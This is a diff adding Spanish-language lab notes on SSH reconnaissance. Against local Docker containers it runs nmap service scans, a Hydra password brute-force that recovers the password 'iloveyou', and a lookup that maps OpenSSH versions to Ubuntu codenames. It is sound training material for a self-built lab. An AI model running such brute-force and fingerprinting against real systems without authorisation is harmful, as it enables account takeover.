@@ -1429,6 +1429,49 @@ docker run -d \
 
 ```
 
+```bash
+# Paso a paso de la máquina corrida con el comando anterior
+docker ps
+
+ssh gerardo@127.0.0.1 -p 2222
+#introducimos clave iloveyou
+nmap -p2222 -v -sV 127.0.0.1
+# RESULTADOS
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-27 20:00 CST
+NSE: Loaded 46 scripts for scanning.
+Initiating Ping Scan at 20:00
+Scanning 127.0.0.1 [2 ports]
+Completed Ping Scan at 20:00, 0.00s elapsed (1 total hosts)
+Initiating Connect Scan at 20:00
+Scanning localhost (127.0.0.1) [1 port]
+Discovered open port 2222/tcp on 127.0.0.1
+Completed Connect Scan at 20:00, 0.00s elapsed (1 total ports)
+Initiating Service scan at 20:00
+Scanning 1 service on localhost (127.0.0.1)
+Completed Service scan at 20:00, 0.18s elapsed (1 service on 1 host)
+NSE: Script scanning 127.0.0.1.
+Initiating NSE at 20:00
+Completed NSE at 20:00, 0.00s elapsed
+Initiating NSE at 20:00
+Completed NSE at 20:00, 0.01s elapsed
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00013s latency).
+
+#APLICAMOS FUERZA BRUTA CON HYDRA
+hydra -l gerardo -P pass.txt ssh://127.0.0.1 -s 2222
+#RESULTADOS
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-27 19:59:30
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
+[DATA] attacking ssh://127.0.0.1:2222/
+[2222][ssh] host: 127.0.0.1   login: gerardo   password: iloveyou
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-27 20:00:02
+
+```
+
 Cabe destacar que a través de la versión de SSH, también podemos identificar el codename de la distribución que se está ejecutando en el sistema.
 
 Por ejemplo, si la versión del servidor SSH es "OpenSSH 8.2p1 Ubuntu 4ubuntu0.5", podemos determinar que el sistema está ejecutando una distribución de Ubuntu. El número de versión "4buntu0.5" se refiere a la revisión específica del paquete de SSH en esa distribución de Ubuntu. A partir de esto, podemos identificar el **codename** de la distribución de Ubuntu, que en este caso sería "Focal" para Ubuntu 20.04.
@@ -1436,3 +1479,51 @@ Por ejemplo, si la versión del servidor SSH es "OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
 Todas estas búsquedas las aplicamos sobre el siguiente dominio:
 
 [Launchpad](https://launchpad.net/ubuntu)
+
+```bash
+# Contruimos una imagen nueva para revisar el codename y hacer reconocimiento
+nano Dockerfile
+
+FROM ubuntu:14.04
+
+MAINTAINER Jose Gerardo Salvador Perez Sanchez
+
+EXPOSE 22
+
+RUN apt update && apt install -y net-tools \
+    iputils-ping \
+    curl \
+    git \
+    nano \
+    ssh
+
+ENTRYPOINT service ssh start && /bin/bash
+
+#GUARDAMOS CTRL S
+docker run -dit -p22:22 --name mySSHServer my_ssh
+nmap -sCV -p22 localhost
+
+#RESULTADOS
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-27 20:27 CST
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00020s latency).
+Other addresses for localhost (not scanned): ::1
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 8b:1a:1b:a9:81:e9:6b:34:ca:d9:1d:2d:5d:21:76:5b (DSA)
+|   2048 88:2f:99:e4:78:6d:d0:00:19:74:5a:3e:9a:b8:5b:d8 (RSA)
+|   256 50:57:fd:27:70:76:d9:77:98:32:0a:3b:4f:46:4c:ed (ECDSA)
+|_  256 cf:00:31:50:10:70:c8:ff:c2:18:bb:d9:d2:db:60:d0 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
+
+#Especificamente notamos la linea de escaneo 22/tcp
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+
+# Para saber la version en la que estamos buscamos en google 
+OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 # mas la palabra launchpad
+```
